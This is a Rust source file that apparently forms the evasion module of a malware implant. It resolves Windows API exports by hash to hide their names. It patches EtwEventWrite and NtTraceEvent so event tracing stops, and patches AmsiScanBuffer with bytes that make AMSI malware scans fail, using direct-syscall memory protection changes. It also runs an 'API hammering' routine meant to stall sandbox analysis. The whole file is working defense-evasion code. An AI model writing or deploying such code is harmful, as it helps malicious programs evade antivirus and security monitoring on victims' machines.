use std::ffi::c_void;

macro_rules! dbg_print {
    ($($arg:tt)*) => {
        #[cfg(feature = "debug_console")]
        println!($($arg)*);
    };
}

const fn djb2(s: &[u8]) -> u32 {
    let mut hash: u32 = 5381;
    let mut i = 0;
    while i < s.len() {
        hash = hash.wrapping_mul(33).wrapping_add(s[i] as u32);
        i += 1;
    }
    hash
}

const HASH_ETW_EVENT_WRITE: u32 = djb2(b"EtwEventWrite");
const HASH_NT_TRACE_EVENT: u32 = djb2(b"NtTraceEvent");
const HASH_AMSI_SCAN_BUFFER: u32 = djb2(b"AmsiScanBuffer");

#[cfg(target_os = "windows")]
unsafe fn f_local_export(module_base: *const u8, target_hash: u32) -> Option<*mut u8> {
    if module_base.is_null() {
        return None;
    }

    let e_lfanew = *(module_base.add(0x3C) as *const u32) as usize;

    let pe_sig = *(module_base.add(e_lfanew) as *const u32);
    if pe_sig != 0x00004550 {
        return None;
    }

    let export_dir_rva = *(module_base.add(e_lfanew + 0x88) as *const u32) as usize;
    let export_dir_size = *(module_base.add(e_lfanew + 0x8C) as *const u32) as usize;

    if export_dir_rva == 0 {
        return None;
    }

    let export_dir = module_base.add(export_dir_rva);

    let num_names = *(export_dir.add(0x18) as *const u32) as usize;
    let functions_rva = *(export_dir.add(0x1C) as *const u32) as usize;
    let names_rva = *(export_dir.add(0x20) as *const u32) as usize;
    let ordinals_rva = *(export_dir.add(0x24) as *const u32) as usize;

    let names_table = module_base.add(names_rva) as *const u32;
    let ordinals_table = module_base.add(ordinals_rva) as *const u16;
    let functions_table = module_base.add(functions_rva) as *const u32;

    for i in 0..num_names {
        let name_rva = *names_table.add(i) as usize;
        let name_ptr = module_base.add(name_rva);

        let mut len = 0usize;
        while *name_ptr.add(len) != 0 && len < 256 {
            len += 1;
        }
        let name_bytes = std::slice::from_raw_parts(name_ptr, len);
        let hash = djb2(name_bytes);

        if hash == target_hash {
            let ordinal = *ordinals_table.add(i) as usize;
            let func_rva = *functions_table.add(ordinal) as usize;

            if func_rva >= export_dir_rva && func_rva < export_dir_rva + export_dir_size {
                continue;
            }

            return Some(module_base.add(func_rva) as *mut u8);
        }
    }

    None
}

#[cfg(target_os = "windows")]
pub unsafe fn p_etw() -> bool {
    use windows::Win32::System::LibraryLoader::GetModuleHandleW;
    use windows::core::w;

    let ntdll = match GetModuleHandleW(w!("ntdll.dll")) {
        Ok(h) => h.0 as *const u8,
        Err(_) => return false,
    };

    let mut patched = false;

    if let Some(addr) = f_local_export(ntdll, HASH_ETW_EVENT_WRITE) {
        if p_single_ret(addr) {
            dbg_print!("[evasion] Patched EtwEventWrite");
            patched = true;
        }
    }

    if let Some(addr) = f_local_export(ntdll, HASH_NT_TRACE_EVENT) {
        if p_single_ret(addr) {
            dbg_print!("[evasion] Patched NtTraceEvent");
            patched = true;
        }
    }

    patched
}

#[cfg(not(target_os = "windows"))]
pub unsafe fn p_etw() -> bool { false }

#[cfg(target_os = "windows")]
pub unsafe fn p_amsi() -> bool {
    use windows::Win32::System::LibraryLoader::GetModuleHandleW;
    use windows::core::w;

    let amsi = match GetModuleHandleW(w!("amsi.dll")) {
        Ok(h) => h.0 as *const u8,
        Err(_) => {
            dbg_print!("[evasion] amsi.dll not loaded, skipping");
            return true;
        }
    };

    if let Some(addr) = f_local_export(amsi, HASH_AMSI_SCAN_BUFFER) {
        let patch: [u8; 6] = [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3];

        let mut old_protect: u32 = 0;
        let mut region_base = addr as *mut c_void;
        let mut region_size = patch.len();
        let process = -1isize as *mut c_void;

        let status = crate::internal_api::n_protect_virtual_memory_syscall(
            windows::Win32::Foundation::HANDLE(process),
            &mut region_base as *mut *mut c_void,
            &mut region_size,
            0x40,
            &mut old_protect,
        );

        if status != crate::internal_api::STATUS_SUCCESS {
            dbg_print!("[evasion] AMSI VirtualProtect failed: 0x{:X}", status.0);
            return false;
        }

        std::ptr::copy_nonoverlapping(patch.as_ptr(), addr, patch.len());

        let mut dummy: u32 = 0;
        region_base = addr as *mut c_void;
        region_size = patch.len();
        let _ = crate::internal_api::n_protect_virtual_memory_syscall(
            windows::Win32::Foundation::HANDLE(process),
            &mut region_base as *mut *mut c_void,
            &mut region_size,
            old_protect,
            &mut dummy,
        );

        dbg_print!("[evasion] Patched AmsiScanBuffer");
        true
    } else {
        dbg_print!("[evasion] AmsiScanBuffer not found");
        false
    }
}

#[cfg(not(target_os = "windows"))]
pub unsafe fn p_amsi() -> bool { false }

#[cfg(target_os = "windows")]
unsafe fn p_single_ret(addr: *mut u8) -> bool {
    let patch: [u8; 3] = [0x33, 0xC0, 0xC3];
    let mut old_protect: u32 = 0;
    let mut region_base = addr as *mut c_void;
    let mut region_size = patch.len();
    let process = -1isize as *mut c_void;

    let status = crate::internal_api::n_protect_virtual_memory_syscall(
        windows::Win32::Foundation::HANDLE(process),
        &mut region_base as *mut *mut c_void,
        &mut region_size,
        0x40,
        &mut old_protect,
    );

    if status != crate::internal_api::STATUS_SUCCESS {
        return false;
    }

    std::ptr::copy_nonoverlapping(patch.as_ptr(), addr, patch.len());

    let mut dummy: u32 = 0;
    region_base = addr as *mut c_void;
    region_size = patch.len();
    let _ = crate::internal_api::n_protect_virtual_memory_syscall(
        windows::Win32::Foundation::HANDLE(process),
        &mut region_base as *mut *mut c_void,
        &mut region_size,
        old_protect,
        &mut dummy,
    );

    true
}

pub fn a_hammer() {
    use std::io::{Read, Write};

    let dir = std::env::temp_dir();
    let name = format!("~df{:X}.tmp", g_pseudo_random_seed());
    let path = dir.join(name);

    let size = 0xFFFFF;
    let iterations = 50;

    for _ in 0..iterations {
        if let Ok(mut file) = std::fs::File::create(&path) {
            let data = g_pseudo_random_data(size);
            let _ = file.write_all(&data);
        }

        if let Ok(mut file) = std::fs::File::open(&path) {
            let mut buffer = vec![0u8; size];
            let _ = file.read_exact(&mut buffer);
        }
    }

    let _ = std::fs::remove_file(&path);
    dbg_print!("[evasion] API hammering complete ({} iterations)", iterations);
}

fn g_pseudo_random_seed() -> u32 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .subsec_nanos()
}

fn g_pseudo_random_data(size: usize) -> Vec<u8> {
    let mut data = vec![0u8; size];
    let mut seed: u64 = g_pseudo_random_seed() as u64;
    for chunk in data.chunks_mut(8) {
        seed = seed.wrapping_mul(6364136223846793005).wrapping_add(1442695040888963407);
        let bytes = seed.to_le_bytes();
        for (i, b) in chunk.iter_mut().enumerate() {
            *b = bytes[i % 8];
        }
    }
    data
}
